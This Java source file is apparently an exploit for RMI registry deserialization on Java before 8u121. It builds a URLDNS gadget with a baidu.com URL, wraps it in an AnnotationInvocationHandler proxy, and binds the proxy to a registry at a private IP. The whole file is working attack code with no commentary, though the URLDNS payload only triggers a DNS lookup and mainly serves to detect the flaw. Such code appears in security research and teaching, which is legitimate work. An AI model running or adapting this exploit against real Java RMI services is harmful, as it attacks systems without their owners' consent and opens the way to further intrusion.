package org.example.exploit.before8u121;

import org.example.payload.URLDNS;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.Naming;
import java.rmi.Remote;
import java.util.HashMap;
import java.util.Map;

public class URLDNSAttackRegister {
    public static void main(String[] args) throws Exception {
        String url = "http://www.baidu.com";
        HashMap obj = (HashMap) new URLDNS().getObject(url);

        Map<String, Object> map = new HashMap<String, Object>();
        map.put("DNSURL", obj);

        Class clazz =
                Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor construct = clazz.getDeclaredConstructor(Class.class,
                Map.class);
        construct.setAccessible(true);
        InvocationHandler handler = (InvocationHandler)
                construct.newInstance(Override.class, map);
        Remote proxyEvalObject = (Remote) Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[]{Remote.class}, handler);
        String host = "rmi://192.168.110.146:1099/";
        Naming.rebind(host+"URLDNS", proxyEvalObject);
    }
}
